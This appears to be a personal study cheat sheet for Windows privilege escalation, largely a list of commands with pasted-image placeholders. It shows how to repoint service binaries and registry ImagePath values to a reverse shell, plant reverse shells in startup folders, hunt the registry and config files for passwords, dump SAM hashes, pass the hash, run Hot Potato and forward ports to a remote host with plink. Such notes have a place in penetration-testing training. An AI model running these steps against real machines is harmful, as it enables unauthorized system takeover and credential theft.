## Kernel exploit

Windows exploit suggester : https://github.com/bitsadmin/wesng

https://github.com/SecWiki/windows-kernel-exploits

Watson : https://github.com/rasta-mouse/Watson


## Service Exploits

![[Pasted image 20240325221906.png]]

 ~~~
 sc qc <servicename>
 ~~~

~~~
sc query <servicename>
~~~

~~~
net start/stop <servicename>
~~~


![[Pasted image 20240325222830.png]]

### Insecure Service Permissions

With winpeas , we can check it

~~~
.\accessck.exe /acceptula -uwcqv user <servicename>
~~~

~~~
sc qc <servicename>
~~~

~~~
sc config <servicename> binpath= "\"C:\Priv\rev.exe\""
~~~

### Unquoted Service Path

~~~
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
~~~

just repalce the service app with our rev shell


###  Weak Registry Permission

 In winpeas ,

![[Pasted image 20240326124400.png]]

~~~
powershell -exec bypass
~~~

~~~
Get-Acl <serviceregist-with-path> | Format-List
~~~

~~~
.\accesschk.exe /acceptula -uvwqk <serviceregist-with-path>
~~~

~~~
.\accesschk.exe /accepteula -ucqv user <servicename-alone>
~~~

To check the current values 

~~~
reg query <serviceregist-with-path>
~~~

To overwrite ,

~~~
ref add <serviceregist-with-path> /v ImagePath /t REG_EXPAND_SZ /d <rev_shellpath> /f
~~~

~~~
net start <registry>
~~~


### Insecure Service Executables

![[Pasted image 20240326225308.png]]
Just replace with rev shell

### DLL Hijacking

![[Pasted image 20240326232116.png]]

## Registry Exploits


![[Pasted image 20240327013534.png]]
 To find this manuall , inlinpeas `autorun app`
~~~
reg query  <regpath>
~~~

 ~~~
 copy /Y reverse.exe "<rewrite file path"
 ~~~

  
### AlwaysInstallElevated

~~~
.\winpeas quiet windowscreds
~~~

 https://bherunda.medium.com/windows-privesc-detecting-alwaysinstallelevated-policy-abuse-f3ffa7a734bd



## Passwords

![[Pasted image 20240327033307.png]]

`Searching the registry for passwords`

~~~
reg query HKLM /f password /t REG_SZ /s
~~~

~~~
reg query HKCU /f password /t REG_SZ /s
~~~


 CHeck Autologon creds

~~~
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
~~~

 
Stored creds 

~~~
cmdkey /list
~~~

Using runas we can execute soeme commands

~~~
runas /savecred /user:admin <file path to run >
~~~

### Configuration FIle


![[Pasted image 20240327035258.png]]


~~~
dir /s *pass* == *.config*
~~~

~~~
findstr /si password *.xml *.ini *.txt
~~~


### SAM 


![[Pasted image 20240328014216.png]]
![[Pasted image 20240328014259.png]]

For dumping SAM pass hashes

`Neohapsis  /  credump7 github`

~~~
python2 pwdump.py /<system-file> /<SAM-File>
~~~

![[Pasted image 20240328022657.png]]

~~~
pth-winexec --system *blabla*
~~~

## Scheduled Tasks

~~~
schtasks /query /fo LIST /v
~~~

In powershell

~~~
Get-ScheduledTask | Where {$_.TaskPath -notlike "\Microsoft"} | ft TaskName,TaskPath,State
~~~

### Insecure GUI Apps

   ![[Pasted image 20240328025516.png]]
### Startup Apps

 ![[Pasted image 20240328030138.png]]
  
~~~
.\acceschk.exe /accepteula -d "C:\<filePath>"
~~~

 Create a simple .vbs file as shortcut and put it inside the folder 

restart , it will get u rev shell


![[Pasted image 20240328035614.png]]

### Installed Apps

~~~
.\seatbelt.exe NonstandardProcesses
~~~

To find intresting process

~~~
.\winpeas.exe quiet procesinfo
~~~

### Hot Potato

![[Pasted image 20240328040408.png]]

~~~
.\potato.exe -ip <ip> -cmd "<revshellpath>" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
~~~

## Service Accounts (Rotten/Juicy Potato)

 Older Machiens

## Port Forwarding

~~~
.\plink.exe root@<to-IP> -R 445:localhost:445
~~~


